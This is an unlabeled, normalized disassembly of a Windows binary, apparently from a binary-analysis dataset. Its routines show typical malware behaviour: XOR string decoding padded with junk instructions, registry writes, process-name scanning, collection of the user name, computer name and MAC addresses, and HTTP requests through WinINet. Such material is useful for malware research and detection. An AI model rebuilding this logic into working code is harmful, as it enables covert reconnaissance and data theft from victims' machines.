sub_401000
push esi
push edi
mov edi [ esp + 0x10 ]
mov eax 0x55555556
lea ecx [ edi * 4 ]
imul ecx
mov eax edx
shr eax 0x1f
lea ecx [ edx + eax + 0x4 ]
push ecx
call sub_40bb22
mov edx [ esp + 0x10 ]
mov esi eax
push esi
push edi
push edx
call sub_401040
add esp 0x10
mov eax esi
pop edi
pop esi
retn
sub_401040
push ebp
mov ebp [ esp + 0xc ]
push esi
mov esi [ esp + 0x14 ]
cmp ebp 0x3
jl r-xdata
mov eax [ esp + 0xc ]
mov eax 0xaaaaaaab
push edi
mul ebp
mov edi edx
shr edi 0x1
lea eax [ edi * 4 ]
sub eax edi
neg eax
add ebp eax
mov eax [ esp + 0x10 ]
mov ecx [ esp + 0x14 ]
mov [ esi ] 0x0
mov eax esi
pop esi
sub eax ecx
pop ebp
retn
xor ecx ecx
mov cl [ eax ]
shr ecx 0x2
cmp ebp 0x1
mov dl [ ecx + rw-data ]
mov cl 0x3d
mov [ esi ] dl
jne r-xdata
xor ecx ecx
add esi 0x4
mov cl [ eax ]
add eax 0x3
shr ecx 0x2
mov dl [ ecx + rw-data ]
mov [ esi - 0x4 ] dl
mov cl [ eax - 0x3 ]
xor edx edx
and ecx 0x3
mov dl [ eax - 0x2 ]
shl ecx 0x4
shr edx 0x4
or ecx edx
mov cl [ ecx + rw-data ]
mov [ esi - 0x3 ] cl
mov dl [ eax - 0x2 ]
xor ecx ecx
and edx 0xf
mov cl [ eax - 0x1 ]
shl edx 0x2
shr ecx 0x6
or edx ecx
mov dl [ edx + rw-data ]
mov [ esi - 0x2 ] dl
mov cl [ eax - 0x1 ]
and ecx 0x3f
dec edi
mov dl [ ecx + rw-data ]
mov [ esi - 0x1 ] dl
jne r-xdata
pop edi
jmp r-xdata
mov dl [ eax ]
push ebx
xor ebx ebx
and edx 0x3
mov bl [ eax + 0x1 ]
shl edx 0x4
shr ebx 0x4
or edx ebx
pop ebx
mov dl [ edx + rw-data ]
mov [ esi + 0x1 ] dl
mov al [ eax + 0x1 ]
and eax 0xf
add esi 0x4
mov dl [ eax * 4 + rw-data ]
mov [ esi - 0x2 ] dl
mov [ esi - 0x1 ] cl
mov al [ eax ]
add esi 0x4
and eax 0x3
shl eax 0x4
mov dl [ eax + rw-data ]
mov [ esi - 0x2 ] cl
mov [ esi - 0x3 ] dl
mov [ esi - 0x1 ] cl
mov ecx [ esp + 0x14 ]
mov [ esi ] 0x0
mov eax esi
pop esi
sub eax ecx
pop ebp
retn
test ebp ebp
jle r-xdata
sub_401210
push 0xffffffff
push sub_425be8
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x60
push esi
mov esi ecx
push 0x0
call sub_403c00
add esp 0x4
mov ecx esi
call sub_4228c1
push 0x0
lea ecx [ esp + 0x8 ]
call sub_402670
lea eax [ esp + 0x4 ]
lea ecx [ esp + 0x4 ]
mov [ esp + 0x6c ] 0x0
mov [ esi + 0x1c ] eax
call sub_41bce1
lea ecx [ esp + 0x4 ]
mov [ esp + 0x6c ] 0xffffffff
call sub_41b9b4
mov ecx [ esp + 0x64 ]
xor eax eax
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x6c
retn
sub_401290
push 0xffffffff
push sub_425c10
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x20
mov eax [ rw-data ]
mov [ esp ] eax
mov ecx [ esp + 0x30 ]
lea edx [ esp ]
push ecx
push rw-data
push edx
mov [ esp + 0x34 ] 0x0
call sub_41a3aa
add esp 0xc
lea ecx [ esp + 0x4 ]
call sub_404504
mov eax [ esp ]
push 0x0
push eax
lea ecx [ esp + 0xc ]
mov [ esp + 0x30 ] 0x1
call sub_4045c7
test eax eax
je r-xdata
lea ecx [ esp + 0x4 ]
call sub_40457d
lea ecx [ esp + 0x4 ]
mov [ esp + 0x28 ] 0x0
call sub_404541
lea ecx [ esp ]
mov [ esp + 0x28 ] 0xffffffff
call sub_41c358
mov ecx [ esp + 0x20 ]
mov [ fs : 0x0 ] ecx
add esp 0x2c
retn
push esi
push edi
mov edi [ DeleteFileA@IAT ]
test esi esi
jne r-xdata
mov edx [ esp + 0xc ]
push 0x10
lea ecx [ esp + 0x10 ]
call [ edx + 0x38 ]
cmp eax 0x1
je r-xdata
lea ecx [ esp + 0xc ]
call sub_4047e7
lea ecx [ esp + 0xc ]
mov esi eax
call sub_4047ae
cmp eax 0x1
je r-xdata
pop edi
pop esi
lea eax [ esp + 0x38 ]
lea ecx [ esp + 0xc ]
push eax
call sub_4048b6
mov eax [ eax ]
push eax
call edi
lea ecx [ esp + 0x38 ]
call sub_41c358
sub_401380
push ebp
mov ebp esp
mov edx [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
push ebx
push esi
test edx edx
mov eax rw-data
jle r-xdata
pop esi
pop ebx
pop ebp
retn
mov esi edx
push ebx
nop
nop
inc ebx
xchg ebx ebx
nop
dec ebx
pop ebx
mov dl [ eax ]
mov bl [ ecx ]
add dl 0x17
xor bl dl
inc eax
mov [ ecx ] bl
inc ecx
dec esi
jne r-xdata
mov eax rw-data
cmp [ eax ] 0x0
jne r-xdata
sub_4013c0
push ecx
push ebx
push ebp
push esi
push edi
push 0x3c
xor ebp ebp
call sub_40bb22
push rw-data
push rw-data
push rw-data
mov esi eax
call sub_40c042
push esi
call sub_4015f0
add esp 0x14
add esi 0x4
mov ebx rw-data
mov [ esp + 0x10 ] esi
pop edi
pop esi
pop ebp
pop ebx
pop ecx
retn
cmp [ esi ] 0x1
jne r-xdata
mov esi [ esp + 0x10 ]
inc ebp
add esi 0x4
add ebx 0x4
mov [ esp + 0x10 ] esi
jmp r-xdata
mov eax [ ebx ]
push eax
push rw-data
push rw-data
call sub_40c042
push ebp
push rw-data
push rw-data
call sub_40c042
mov edi rw-data
or ecx 0xffffffff
xor eax eax
add esp 0x18
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edx ecx
mov edi rw-data
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edx ecx
mov edi rw-data
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
cmp ebx rw-data
je r-xdata
sub_4014b0
push ecx
mov edx [ esp + 0x10 ]
lea eax [ esp ]
lea ecx [ esp + 0x10 ]
push eax
push ecx
push 0x0
push 0xf003f
push 0x0
push 0x0
push 0x0
push edx
push 0x80000001
call [ RegCreateKeyExA@IAT ]
test eax eax
jne r-xdata
xor eax eax
pop ecx
retn
mov edx [ esp + 0xc ]
push esi
push edi
mov edi edx
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
push ecx
mov ecx [ esp + 0x1c ]
push edx
push 0x1
push eax
mov eax [ esp + 0x20 ]
push eax
push ecx
call [ RegSetValueExA@IAT ]
mov edx [ esp + 0x18 ]
mov esi eax
push edx
call [ RegCloseKey@IAT ]
pop edi
test esi esi
pop esi
jne r-xdata
mov eax 0x1
pop ecx
retn
sub_401520
push ebp
mov ebp esp
sub esp 0x10
mov al 0x1
push ebx
mov [ ebp - 0x10 ] al
mov [ ebp - 0xf ] al
mov al 0x4
push esi
mov esi [ ebp + 0x8 ]
mov [ ebp - 0xc ] al
mov [ ebp - 0xb ] al
mov al 0x40
mov [ ebp - 0x5 ] al
mov [ ebp - 0x4 ] al
mov cl 0x10
mov al 0x80
push edi
mov [ ebp - 0xd ] cl
mov [ ebp - 0x8 ] cl
mov [ ebp - 0x2 ] al
mov [ ebp - 0x1 ] al
mov edi esi
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
xor edi edi
mov edx ecx
mov [ ebp - 0xe ] 0x2
test edx edx
mov [ ebp - 0xa ] 0x8
mov [ ebp - 0x9 ] 0x8
mov [ ebp - 0x7 ] 0x2
mov [ ebp - 0x6 ] 0x20
mov [ ebp - 0x3 ] 0x20
jle r-xdata
mov edi esi
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
add ecx 0xfffffffe
cmp [ ecx + esi ] 0x20
jne r-xdata
xor cl cl
lea eax [ ebp - 0xf ]
mov [ ebp + 0x8 ] 0x8
mov [ ecx + esi + 0x1 ] 0x0
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
test ecx ecx
jle r-xdata
mov bl [ eax ]
not bl
and cl bl
push ebx
inc ebx
xchg ebx ebx
dec ebx
nop
pop ebx
or cl [ eax ]
jmp r-xdata
mov al [ ecx + esi - 0x1 ]
dec ecx
cmp al 0x20
je r-xdata
mov bl [ eax - 0x1 ]
test [ edi + esi ] bl
je r-xdata
mov [ edi + esi ] cl
inc edi
cmp edi edx
jl r-xdata
mov ebx [ ebp + 0x8 ]
add eax 0x2
dec ebx
mov [ ebp + 0x8 ] ebx
jne r-xdata
sub_4015f0
sub esp 0x38
push ebx
mov ebx [ esp + 0x40 ]
push esi
push edi
lea edi [ ebx + 0x4 ]
mov ecx 0xe
xor eax eax
mov [ ebx ] 0x0
[ edi ]
mov [ esp + 0xc ] rw-data
mov [ esp + 0x10 ] rw-data
mov [ esp + 0x14 ] rw-data
mov [ esp + 0x18 ] rw-data
mov [ esp + 0x1c ] rw-data
mov [ esp + 0x20 ] rw-data
mov [ esp + 0x24 ] rw-data
mov [ esp + 0x28 ] rw-data
mov [ esp + 0x2c ] rw-data
mov [ esp + 0x30 ] rw-data
mov [ esp + 0x34 ] rw-data
mov [ esp + 0x38 ] rw-data
mov [ esp + 0x3c ] rw-data
mov [ esp + 0x40 ] rw-data
lea esi [ esp + 0xc ]
mov edi 0xe
mov eax [ esi ]
push eax
call sub_401520
add esp 0x4
add esi 0x4
dec edi
jne r-xdata
mov esi 0x4
lea edi [ esp + 0xc ]
sub edi esi
add esi 0x4
cmp esi 0x3c
jl r-xdata
mov [ esi + ebx ] 0x1
mov eax [ ebx ]
inc eax
mov [ ebx ] eax
mov ecx [ edi + esi ]
push ecx
call sub_4016e0
add esp 0x4
test eax eax
je r-xdata
pop edi
pop esi
mov eax 0x1
pop ebx
add esp 0x38
retn
sub_4016e0
sub esp 0x12c
push esi
push 0x0
push 0x2
mov [ esp + 0xc ] 0x0
call CreateToolhelp32Snapshot
mov esi eax
cmp esi 0xffffffff
jne r-xdata
push ebx
lea eax [ esp + 0xc ]
push ebp
push eax
push esi
mov [ esp + 0x18 ] 0x128
call Process32First
test eax eax
je r-xdata
xor eax eax
pop esi
add esp 0x12c
retn
push esi
call [ CloseHandle@IAT ]
mov ecx [ esp + 0xc ]
xor eax eax
test ecx ecx
pop ebp
pop ebx
setne al
pop esi
add esp 0x12c
retn
mov ebx [ esp + 0x13c ]
mov ebp [ StrStrIA@IAT ]
mov [ esp + 0xc ] 0x1
lea edx [ esp + 0x10 ]
push edx
push esi
call Process32Next
test eax eax
mov [ esp + 0x10 ] 0x128
jne r-xdata
lea ecx [ esp + 0x34 ]
push ebx
push ecx
call ebp
test eax eax
jne r-xdata
jmp r-xdata
sub_401780
sub esp 0x6c
push esi
push edi
mov ecx 0x6
mov esi rw-data
lea edi [ esp + 0x18 ]
lea eax [ esp + 0x18 ]
[ edi ] [ esi ]
push eax
call sub_401520
add esp 0x4
lea ecx [ esp + 0x18 ]
push ecx
push rw-data
call [ GetModuleHandleA@IAT ]
push eax
call [ GetProcAddress@IAT ]
mov edx eax
mov ecx 0x11
xor eax eax
lea edi [ esp + 0x30 ]
[ edi ]
lea eax [ esp + 0x8 ]
lea ecx [ esp + 0x30 ]
push eax
mov eax [ esp + 0x7c ]
push ecx
push 0x0
push 0x0
push 0x20
push 0x0
push 0x0
push 0x0
push 0x0
push eax
mov [ esp + 0x58 ] 0x44
mov [ esp + 0x84 ] 0x81
mov [ esp + 0x88 ] 0x5
call edx
dec eax
pop edi
neg eax
sbb eax eax
pop esi
add esp 0x6c
retn
sub_401810
mov eax 0x1a40
call sub_40c4f0
push esi
push edi
call sub_4020c0
mov al [ rw-data ]
test al al
je r-xdata
mov ecx 0xb
mov esi rw-data
lea edi [ esp + 0x110 ]
push ebx
[ edi ] [ esi ]
movsw [ edi ] [ esi ]
movsb [ edi ] [ esi ]
mov ecx 0x5
mov esi rw-data
lea edi [ esp + 0x38 ]
push ebp
[ edi ] [ esi ]
lea ecx [ esp + 0x118 ]
mov [ esp + 0x147 ] 0x0
push ecx
mov [ esp + 0x54 ] 0x0
call sub_401520
lea edx [ esp + 0x40 ]
push edx
call sub_401520
add esp 0x8
lea eax [ esp + 0x118 ]
push rw-data
push 0x20019
push 0x0
push eax
push 0x80000002
call [ RegOpenKeyExA@IAT ]
mov ebx [ RegQueryValueExA@IAT ]
mov [ rw-data ] eax
test eax eax
jne r-xdata
push rw-data
call sub_403080
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
push ecx
push rw-data
push rw-data
call sub_4030c0
push rw-data
push rw-data
call sub_4031b0
add esp 0x18
xor esi esi
mov edi rw-data
mov ecx [ rw-data ]
mov ebp [ RegCloseKey@IAT ]
push ecx
call ebp
mov ecx 0xb
mov esi rw-data
lea edi [ esp + 0xe4 ]
lea edx [ esp + 0xe4 ]
[ edi ] [ esi ]
movsw [ edi ] [ esi ]
push edx
mov [ esp + 0x116 ] 0x0
call sub_401520
add esp 0x4
lea eax [ esp + 0xe4 ]
push rw-data
push 0x20019
push 0x0
push eax
push 0x80000002
call [ RegOpenKeyExA@IAT ]
test eax eax
mov [ rw-data ] eax
jne r-xdata
mov ecx 0x100
xor eax eax
lea edi [ esp + 0x250 ]
push rw-data
[ edi ]
lea ecx [ esp + 0x254 ]
lea edx [ esp + 0x40 ]
push ecx
push rw-data
push eax
mov eax [ rw-data ]
push edx
push eax
mov [ rw-data ] 0x400
call ebx
test eax eax
je r-xdata
xor eax eax
mov al [ esi + rw-data ]
push eax
push rw-data
push 0x20
push edi
call sub_40c490
add esp 0x10
inc esi
add edi 0x2
cmp esi 0x10
jl r-xdata
mov [ rw-data ] 0x0
push rw-data
call sub_40cc3f
add esp 0x4
mov [ rw-data ] eax
mov ecx 0x100
lea edi [ esp + 0x250 ]
mov edx [ rw-data ]
push rw-data
[ edi ]
lea ecx [ esp + 0x254 ]
mov [ rw-data ] 0x400
push ecx
push rw-data
push eax
push rw-data
push edx
call ebx
test eax eax
jne r-xdata
mov al [ esp + 0x250 ]
mov edx [ rw-data ]
lea ecx [ esp + 0x250 ]
push rw-data
push ecx
push rw-data
push 0x0
push rw-data
push edx
call ebx
test eax eax
je r-xdata
mov eax [ rw-data ]
push eax
call ebp
mov esi 0x7f
push rw-data
push rw-data
mov [ rw-data ] esi
call [ GetComputerNameA@IAT ]
push rw-data
push rw-data
mov [ rw-data ] esi
call [ GetUserNameA@IAT ]
push 0x280
call sub_40bb22
add esp 0x4
lea ecx [ esp + 0x10 ]
mov esi eax
mov [ esp + 0x10 ] 0x280
push ecx
push esi
call GetAdaptersInfo
cmp eax 0x6f
jne r-xdata
mov ecx [ rw-data ]
lea edi [ esp + 0x250 ]
mov edx ecx
push rw-data
shr ecx 0x2
[ edi ]
mov ecx edx
push rw-data
and ecx 0x3
push rw-data
[ edi ]
mov eax [ rw-data ]
push 0x0
mov esi 0x400
push rw-data
push eax
mov [ rw-data ] esi
call ebx
test eax eax
mov [ rw-data ] eax
je r-xdata
lea eax [ esp + 0x250 ]
push eax
call sub_40cc3f
push rw-data
push eax
mov [ rw-data ] eax
call sub_40c410
add esp 0xc
test eax eax
je r-xdata
mov al [ ecx ]
test al al
je r-xdata
cmp al 0x20
je r-xdata
xor al al
mov [ esp + 0x250 ] al
jmp r-xdata
lea eax [ esp + 0x10 ]
push eax
push esi
call GetAdaptersInfo
test eax eax
jne r-xdata
push esi
call sub_40c218
mov edx [ esp + 0x14 ]
push edx
call sub_40bb22
add esp 0x8
mov esi eax
mov ecx [ rw-data ]
xor eax eax
mov edx ecx
lea edi [ esp + 0x250 ]
shr ecx 0x2
[ edi ]
mov ecx edx
push rw-data
and ecx 0x3
push rw-data
[ edi ]
mov eax [ rw-data ]
push rw-data
push 0x0
push rw-data
push eax
mov [ rw-data ] esi
call ebx
test eax eax
mov [ rw-data ] eax
je r-xdata
mov [ rw-data ] 0x0
mov ecx [ rw-data ]
push rw-data
push ecx
call sub_40c410
add esp 0x8
test eax eax
je r-xdata
push rw-data
jmp r-xdata
lea eax [ esp + 0x250 ]
mov [ esi ] 0x0
push eax
call sub_40cc3f
add esp 0x4
mov [ rw-data ] eax
mov [ esi ] al
mov al [ ecx + 0x1 ]
inc esi
inc ecx
test al al
jne r-xdata
mov al [ ecx + 0x1 ]
inc ecx
test al al
jne r-xdata
cmp al 0x9
jne r-xdata
test al al
lea ecx [ esp + 0x250 ]
lea esi [ esp + 0x250 ]
je r-xdata
lea ecx [ esp + 0x650 ]
push rw-data
push ecx
call sub_40c042
add esp 0x8
test esi esi
mov [ esp + 0x650 ] al
mov edx esi
je r-xdata
mov ecx [ rw-data ]
xor eax eax
mov edx ecx
lea edi [ esp + 0x250 ]
shr ecx 0x2
[ edi ]
mov ecx edx
push rw-data
and ecx 0x3
push rw-data
[ edi ]
mov eax [ rw-data ]
push rw-data
push 0x0
push rw-data
push eax
mov [ rw-data ] esi
call ebx
test eax eax
mov [ rw-data ] eax
je r-xdata
mov edx [ rw-data ]
push rw-data
push edx
call sub_40c410
add esp 0x8
test eax eax
je r-xdata
push rw-data
jmp r-xdata
push rw-data
call sub_40c042
add esp 0x8
xor esi esi
push rw-data
push rw-data
call sub_40c205
mov edi eax
add esp 0x8
test edi edi
je r-xdata
mov ecx 0x400
xor eax eax
lea edi [ esp + 0xa50 ]
push rw-data
[ edi ]
call sub_401520
push rw-data
push rw-data
push rw-data
push rw-data
call sub_40c042
add esp 0x14
push rw-data
call [ PathFileExistsA@IAT ]
pop ebp
pop ebx
test eax eax
je r-xdata
lea edi [ edx + 0x1b0 ]
or ecx 0xffffffff
xor eax eax
lea ebx [ esp + 0x650 ]
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebp ecx
mov edi ebx
or ecx 0xffffffff
[ edi ]
mov ecx ebp
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebp
lea ebx [ esp + 0x650 ]
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebp ecx
mov edi ebx
or ecx 0xffffffff
[ edi ]
mov ecx ebp
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebp
and ecx 0x3
[ edi ] [ esi ]
mov edx [ edx ]
test edx edx
jne r-xdata
mov ecx esi
xor eax eax
lea edi [ esp + 0xa50 ]
push rw-data
[ edi ]
push rw-data
lea ecx [ esp + 0xa58 ]
push 0x1000
push ecx
call sub_40c490
lea edi [ esp + 0xa60 ]
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0xa60 ]
[ edi ]
not ecx
dec ecx
push ecx
push edx
push rw-data
call sub_40c260
add esp 0x1c
mov eax [ rw-data ]
push rw-data
push eax
call sub_40c410
add esp 0x8
test eax eax
je r-xdata
push rw-data
jmp r-xdata
mov ecx [ rw-data ]
push ecx
call ebp
mov ecx 0xb
mov esi rw-data
lea edi [ esp + 0xb4 ]
xor edx edx
[ edi ] [ esi ]
movsb [ edi ] [ esi ]
lea eax [ esp + 0xb4 ]
mov [ esp + 0xe1 ] dx
push eax
mov [ esp + 0xe7 ] dl
call sub_401520
add esp 0x4
lea ecx [ esp + 0xb4 ]
push rw-data
push 0x20019
push 0x0
push ecx
push 0x80000002
call [ RegOpenKeyExA@IAT ]
test eax eax
mov [ rw-data ] eax
jne r-xdata
lea eax [ esp + 0x14c ]
push eax
push rw-data
push rw-data
call sub_4014b0
add esp 0xc
jmp r-xdata
mov esi [ esp + 0x10 ]
lea edx [ esp + 0xa48 ]
push edx
push rw-data
push edi
call sub_40c1a7
lea eax [ esp + 0xa54 ]
push eax
call sub_40c19c
push edi
mov esi eax
call sub_40c094
add esp 0x14
jmp r-xdata
jmp r-xdata
mov ecx [ rw-data ]
push rw-data
push ecx
call sub_40c410
add esp 0x8
test eax eax
je r-xdata
push rw-data
jmp r-xdata
mov esi 0x3e7
jmp r-xdata
cmp esi 0x3e8
jle r-xdata
cmp esi 0x1
jl r-xdata
mov ecx 0xb
mov esi rw-data
lea edi [ esp + 0x14c ]
xor eax eax
[ edi ] [ esi ]
movsw [ edi ] [ esi ]
mov ecx 0x35
lea edi [ esp + 0x17a ]
[ edi ]
mov edx [ rw-data ]
mov cl [ rw-data ]
stosw [ edi ]
mov ax [ rw-data ]
mov [ esp + 0x54 ] edx
mov edx [ rw-data ]
mov [ esp + 0x58 ] ax
mov [ esp + 0x5a ] cl
mov ecx 0x6
xor eax eax
lea edi [ esp + 0x5b ]
[ edi ]
mov [ esp + 0x1c ] edx
xor edx edx
mov cl [ rw-data ]
mov [ esp + 0x25 ] edx
mov [ esp + 0x29 ] edx
mov [ esp + 0x24 ] cl
mov ecx [ rw-data ]
mov [ esp + 0x2d ] edx
stosb [ edi ]
mov eax [ rw-data ]
mov [ esp + 0x31 ] edx
mov [ esp + 0x20 ] eax
mov eax [ rw-data ]
mov [ esp + 0x35 ] edx
mov [ esp + 0x74 ] eax
mov al [ rw-data ]
mov [ esp + 0x39 ] dx
mov [ esp + 0x3b ] dl
mov edx [ rw-data ]
mov [ esp + 0x78 ] ecx
mov [ esp + 0x80 ] al
mov ecx 0xc
xor eax eax
lea edi [ esp + 0x81 ]
mov [ esp + 0x7c ] edx
[ edi ]
stosw [ edi ]
lea ecx [ esp + 0x14c ]
mov [ esp + 0x18 ] 0x104
push ecx
stosb [ edi ]
call sub_401520
lea edx [ esp + 0x78 ]
push edx
call sub_401520
add esp 0x8
lea eax [ esp + 0x14 ]
lea ecx [ esp + 0x14c ]
push eax
push 0x20019
push 0x0
push ecx
push 0x80000001
call [ RegOpenKeyExA@IAT ]
lea edx [ esp + 0x18 ]
lea eax [ esp + 0x54 ]
push edx
mov edx [ esp + 0x18 ]
push eax
push 0x0
lea ecx [ esp + 0x80 ]
push 0x0
push ecx
push edx
call ebx
mov eax [ esp + 0x14 ]
push eax
call ebp
lea ecx [ esp + 0x54 ]
push ecx
lea edx [ esp + 0x20 ]
push rw-data
push edx
call sub_40c042
lea eax [ esp + 0x28 ]
push rw-data
push eax
call sub_40c35e
push 0x12c
push rw-data
push rw-data
push rw-data
push rw-data
call sub_40c042
lea ecx [ esp + 0x9c ]
lea edx [ esp + 0x44 ]
push ecx
push edx
call sub_40c410
add esp 0x30
test eax eax
jne r-xdata
push rw-data
mov edx [ rw-data ]
mov eax [ rw-data ]
lea ecx [ esp + 0x648 ]
push rw-data
push ecx
push rw-data
push esi
push rw-data
push rw-data
push edx
push eax
push rw-data
push rw-data
lea ecx [ esp + 0xa70 ]
push rw-data
push ecx
call sub_40c042
lea edx [ esp + 0xa78 ]
push edx
call sub_40cc3f
add esp 0x34
mov [ rw-data ] eax
xor eax eax
pop edi
pop esi
add esp 0x1a40
retn
sub_4020c0
mov eax 0x14020
call sub_40c4f0
push edi
push rw-data
push rw-data
xor edi edi
call sub_40c042
add esp 0x8
lea eax [ esp + 0x10 ]
lea ecx [ esp + 0x24 ]
mov [ esp + 0x10 ] 0x14000
push eax
push ecx
call GetAdaptersInfo
xor edx edx
mov [ esp + 0x4 ] edx
test eax eax
mov [ esp + 0x8 ] dx
jne r-xdata
pop edi
add esp 0x14020
retn
push esi
lea esi [ esp + 0x28 ]
mov cl [ esi + eax + 0x194 ]
mov dl [ esp + eax + 0x8 ]
xor dl cl
mov [ esp + eax + 0x8 ] dl
inc eax
cmp eax 0x6
jl r-xdata
mov esi [ esi ]
inc edi
test esi esi
je r-xdata
mov edx [ esp + 0xd ]
mov eax [ esp + 0xc ]
mov ecx [ esp + 0xb ]
and edx 0xff
and eax 0xff
push edx
mov edx [ esp + 0xe ]
and ecx 0xff
push eax
mov eax [ esp + 0x11 ]
push ecx
mov ecx [ esp + 0x14 ]
and edx 0xff
and eax 0xff
push edx
and ecx 0xff
push eax
push ecx
push rw-data
push rw-data
call sub_40c042
add esp 0x20
pop esi
cmp edi 0xa
jl r-xdata
xor eax eax
xor ecx ecx
mov al [ esi + 0x199 ]
mov cl [ esi + 0x198 ]
xor edx edx
push eax
mov dl [ esi + 0x197 ]
push ecx
xor eax eax
push edx
mov al [ esi + 0x196 ]
xor ecx ecx
mov cl [ esi + 0x195 ]
xor edx edx
mov dl [ esi + 0x194 ]
push eax
push ecx
push edx
lea eax [ esp + 0x30 ]
push rw-data
push eax
call sub_40c042
add esp 0x20
xor eax eax
sub_4021e0
sub esp 0xa8
push ebx
push ebp
push esi
push edi
mov ecx 0x26
mov esi rw-data
lea edi [ esp + 0x20 ]
lea eax [ esp + 0x20 ]
[ edi ] [ esi ]
push eax
mov [ esp + 0x20 ] 0x4
call sub_401520
add esp 0x4
lea ecx [ esp + 0x20 ]
push 0x0
push 0x0
push 0x0
push 0x4
push ecx
call [ InternetOpenA@IAT ]
mov ebx eax
test ebx ebx
mov [ esp + 0x18 ] ebx
je r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0xa8
retn
mov edx [ esp + 0xc8 ]
mov eax [ esp + 0xc4 ]
push 0x0
push 0x0
push 0x3
push 0x0
push 0x0
push edx
push eax
push ebx
call [ InternetConnectA@IAT ]
mov ebp eax
test ebp ebp
jne r-xdata
mov eax [ esp + 0xcc ]
dec eax
je r-xdata
push ebx
call [ InternetCloseHandle@IAT ]
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0xa8
retn
mov edx [ esp + 0xbc ]
push 0x0
push 0x4400100
push 0x0
push 0x0
push 0x0
push edx
push rw-data
push ebp
call [ HttpOpenRequestA@IAT ]
mov esi eax
test esi esi
jne r-xdata
dec eax
jne r-xdata
push 0x0
push 0x0
push 0x0
push 0x0
push esi
call [ HttpSendRequestA@IAT ]
jmp r-xdata
mov esi [ InternetCloseHandle@IAT ]
push ebp
call esi
push ebx
call esi
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0xa8
retn
mov esi [ esp + 0x14 ]
mov ecx [ esp + 0xbc ]
push 0x0
push 0x4400100
push 0x0
push 0x0
push 0x0
push ecx
push rw-data
push ebp
call [ HttpOpenRequestA@IAT ]
mov esi eax
test esi esi
jne r-xdata
lea eax [ esp + 0x1c ]
push 0x0
lea ecx [ esp + 0x14 ]
push eax
push ecx
push 0x20000013
push esi
call [ HttpQueryInfoA@IAT ]
mov eax [ esp + 0x10 ]
cmp eax 0x197
je r-xdata
push 0x3e8
call sub_40c51f
add esp 0x4
test esi esi
je r-xdata
push 0x400
mov [ rw-data ] eax
call sub_40bb22
add esp 0x4
mov edi eax
xor ebx ebx
mov edx [ esp + 0xc0 ]
or ecx 0xffffffff
mov edi edx
xor eax eax
[ edi ]
not ecx
dec ecx
push ecx
push edx
push eax
push eax
push esi
call [ HttpSendRequestA@IAT ]
jmp r-xdata
mov esi [ InternetCloseHandle@IAT ]
push ebp
call esi
push ebx
call esi
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0xa8
retn
call [ GetLastError@IAT ]
xor eax eax
jmp r-xdata
test edi edi
je r-xdata
mov eax [ esp + 0x14 ]
test eax eax
je r-xdata
push 0x0
push 0x7
push eax
push esi
call [ GetDesktopWindow@IAT ]
push eax
call [ InternetErrorDlg@IAT ]
push esi
mov esi [ InternetCloseHandle@IAT ]
call esi
push ebp
call esi
push ebx
call esi
mov ecx [ esp + 0x10 ]
mov [ rw-data ] ecx
push esi
mov esi [ InternetCloseHandle@IAT ]
mov [ rw-data ] 0x0
call esi
push ebp
call esi
mov edx [ esp + 0x18 ]
push edx
call esi
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0xa8
retn
push edi
call sub_40c218
add esp 0x4
push esi
mov esi [ InternetCloseHandle@IAT ]
mov [ ebx + edi ] 0x0
mov [ rw-data ] ebx
call esi
push ebp
call esi
mov eax [ esp + 0x18 ]
push eax
call esi
mov eax edi
pop edi
pop esi
pop ebp
pop ebx
add esp 0xa8
retn
add ebx eax
lea ecx [ ebx + 0x400 ]
push ecx
push edi
call sub_40c532
add esp 0x8
mov edi eax
jmp r-xdata
lea edx [ esp + 0x14 ]
lea eax [ ebx + edi ]
push edx
push 0x3ff
push eax
push esi
call [ InternetReadFile@IAT ]
test eax eax
je r-xdata
sub_402460
push ecx
push rw-data
push rw-data
mov [ esp + 0x8 ] 0x0
call [ GetModuleHandleA@IAT ]
push eax
call [ GetProcAddress@IAT ]
test eax eax
mov [ rw-data ] eax
je r-xdata
mov eax [ esp ]
pop ecx
retn
lea eax [ esp ]
push eax
call [ GetCurrentProcess@IAT ]
push eax
call [ rw-data ]
sub_4024b0
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x8
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
call sub_402460
test eax eax
jne r-xdata
xor al al
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebp - 0x4 ] eax
mov eax 0x1
seto [ edi ]
pop es
nop
or edx [ eax + 0x45c79090 ]
nop
cld
sub_402540
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0xc
